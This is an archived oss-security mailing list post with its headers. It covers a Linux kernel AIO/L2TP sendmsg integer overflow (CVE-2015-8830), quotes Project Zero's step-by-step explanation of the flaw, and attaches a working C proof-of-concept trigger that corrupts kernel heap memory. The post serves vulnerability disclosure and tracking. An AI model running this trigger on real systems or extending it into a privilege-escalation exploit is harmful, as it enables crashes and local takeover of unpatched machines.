X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6785" "Sunday" "5" "June" "2016" "19:05:11" "+0300" "Solar Designer" "solar@openwall.com" "<20160605160511.GA18786@openwall.com>" "160" "Re: [oss-security] CVE Request: Linux: aio write triggers integer overflow in some network protocols" nil nil nil "6" "2016060516:05:11" "[oss-security] CVE Request: Linux: aio write triggers integer overflow in some network protocols" (number mark "U       solar@openwa Jun  5  160/6785  " thread-indent "\"Re: [oss-security] CVE Request: Linux: aio write triggers integer overflow in some network protocols\"\n") "<20160302165826.F2E3034E00C@smtpvbsrv1.mitre.org>" ("<20160301161155.GA4786@eldamar.local>" "<20160302165826.F2E3034E00C@smtpvbsrv1.mitre.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 27824 invoked by uid 550); 5 Jun 2016 16:05:50 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 27799 invoked from network); 5 Jun 2016 16:05:49 -0000
Date: Sun, 5 Jun 2016 19:05:11 +0300
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Message-ID: <20160605160511.GA18786@openwall.com>
References: <20160301161155.GA4786@eldamar.local> <20160302165826.F2E3034E00C@smtpvbsrv1.mitre.org>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="Qxx1br4bt0+wmkIi"
Content-Disposition: inline
In-Reply-To: <20160302165826.F2E3034E00C@smtpvbsrv1.mitre.org>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] CVE Request: Linux: aio write triggers integer overflow in some network protocols

--Qxx1br4bt0+wmkIi
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Wed, Mar 02, 2016 at 11:58:26AM -0500, cve-assign@mitre.org wrote:
> > https://git.kernel.org/linus/4c185ce06dca14f5cea192f5a2c981ef50663f2b
> > https://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit?id=c4f4b82694fe48b02f7a881a1797131a6dad1364
> 
> > For an upcoming Linux DSA in Debian we would use something like:
> 
> >> Ben Hawkes of Google Project Zero reported that the AIO interface
> >> permitted reading or writing 2 GiB of data or more in a single
> >> chunk, which could lead to an integer overflow when applied to
> >> certain filesystems, socket or device types. The full security
> >> impact has not been evaluated.
> 
> Use CVE-2015-8830.

I don't know if the Project Zero issue was already public in March or
was made public upon expiration of 90 days in May, but either way I'd
like its additional detail archived in this same thread, so here goes:

https://bugs.chromium.org/p/project-zero/issues/detail?id=735

| Linux io_submit L2TP sendmsg integer overflow 	
| Project Member Reported by hawkes@google.com, Feb 20, 2016
| 
| In certain kernel versions it is possible to use the AIO subsystem (io_submit syscall) to pass size values larger than MAX_RW_COUNT to the networking subsystem's sendmsg implementation. In the L2TP PPP sendmsg implementation, a large size parameter can lead to an integer overflow and kernel heap corruption during socket buffer allocation. This could be exploited to allow local privilege escalation from an unprivileged user account.
| 
| This issue affects 64-bit systems running older branches of the Linux kernel, such as version 3.10 and 3.18. More recent major versions aren't affected due to refactoring in the AIO subsystem. The attached proof-of-concept trigger has been tested on a fully updated Ubuntu 14.04 LTS server. This issue is also likely to affect 64-bit Android devices, which typically use branches of 3.10.
| 
| The first observation is that an IOCB_CMD_PWRITE of a large length (such as 0xffffffff) will correctly bound the request iocb's ki_nbytes value to MAX_RW_COUNT. However, in the single vector case, if the relevant access_ok check passes in aio_setup_single_vector then the iov length will still be large (0xffffffff). On 64-bit systems it is possible for access_ok(type, user_ptr, 0xffffffff) to succeed.
| 
| The second observation is that sock_aio_write does not use the iocb for the sendmsg size calculation, but instead takes the summation of all input iov lengths. Thus calling io_submit with an IOCB_CMD_PWRITE operation on a socket will result in a potentially large value being passed to sendmsg.
| 
| The third observation is that AF_PPPOX sockets using the PX_PROTO_OL2TP protocol has a sendmsg implementation that does not bounds check the incoming length parameter (called total_len) before using the value to calculate the length of a socket buffer allocation (using sock_wmalloc).
| 
| The fourth observation is that the underlying socket buffer allocation routine __alloc_skb uses an "unsigned int" for it's size parameter rather than a size_t, and that this value can wrap to a small positive value upon alignment calculations and internal space overhead calculations. This results in a small value being passed to kmalloc for the socket buffer data allocation. Then, the size is recalculated using SKB_WITH_OVERHEAD, which effectively re-underflows the size calculation to a small negative value (large unsigned value). The newly created socket buffer has a small backing data buffer and a large size.
| 
| The proof-of-concept trigger crashes when writing the skb_shared_info structure into the end of the socket buffer, which is out-of-bounds. Other corruption may also be possible in pppol2tp_sendmsg/l2tp_xmit_skb/ip_output.

I've also attached l2tp_ppp_sendmsg.c, which was attached to the above
Project Zero issue.

I haven't looked into the actual issue yet, but a reason why I am
posting this is to once again request this kind of detail to be posted
in here by others.

Red Hat's statement:

https://access.redhat.com/security/cve/cve-2015-8830

RHEL5 not affected, 6 and 7 are (were?)

> > The issue was initially already addressed via
> > 
> > https://git.kernel.org/linus/a70b52ec1aaeaf60f4739edb1b422827cb6f3893 (v3.5-rc1)
> 
> >> vfs: make AIO use the proper rw_verify_area() area helpers
> 
> >> We had for some reason overlooked the AIO interface, and it didn't use
> >> the proper rw_verify_area() helper function that checks (for example)
> >> mandatory locking on the file, and that the size of the access doesn't
> >> cause us to overflow the provided offset limits etc.
> 
> Use CVE-2012-6701.

https://access.redhat.com/security/cve/cve-2012-6701

RHEL5 is affected and "won't fix" ("rated as having Moderate security
impact and is not currently planned to be addressed in future updates"),
6 (was?) affected, 7 was not.  I wonder what the reasoning for the
Moderate severity rating was.

Alexander

--Qxx1br4bt0+wmkIi
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="l2tp_ppp_sendmsg.c"

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/if.h>
#include <linux/if_pppox.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/aio_abi.h>

int main(int argc, char *argv[]) {
	struct sockaddr_pppol2tp sax;
	struct sockaddr_in addr;
	int s, sfd, ret;
	struct iocb *iocbp;
	struct iocb iocb;
	aio_context_t ctx_id = 0;
	void *data;

	s = socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP);

	if (s == -1) {
		perror("socket");
		return -1;
	}

	memset(&sax, 0, sizeof(struct sockaddr_pppol2tp));

	sax.sa_family = AF_PPPOX;
	sax.sa_protocol = PX_PROTO_OL2TP;

	sax.pppol2tp.fd = -1;
	sax.pppol2tp.addr.sin_addr.s_addr = addr.sin_addr.s_addr;
	sax.pppol2tp.addr.sin_port = addr.sin_port;
	sax.pppol2tp.addr.sin_family = AF_INET;
	sax.pppol2tp.s_tunnel  = -1;
	sax.pppol2tp.s_session = 0;
	sax.pppol2tp.d_tunnel  = -1;
	sax.pppol2tp.d_session = 0;

	sfd = connect(s, (struct sockaddr *)&sax, sizeof(sax));

	if (sfd == -1) {
		perror("connect");
		return -1;
	}

	data = mmap(NULL, 0x100001000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	if (data == MAP_FAILED) {
		perror("mmap");
		return -1;
	}

	memset(data, 0x41, 0x100001000);

	ret = syscall(__NR_io_setup, 2, &ctx_id);

	if (ret == -1) {
		perror("io_setup");
		return -1;
	}

	memset(&iocb, 0, sizeof(struct iocb));

	iocb.aio_fildes = s;
	iocb.aio_lio_opcode = IOCB_CMD_PWRITE;
	iocb.aio_nbytes = 0xfffffe60;
	iocb.aio_buf = (unsigned long) &data;

	iocbp = &iocb;

	syscall(__NR_io_submit, ctx_id, 1, &iocbp);

	return 0;
}

--Qxx1br4bt0+wmkIi--
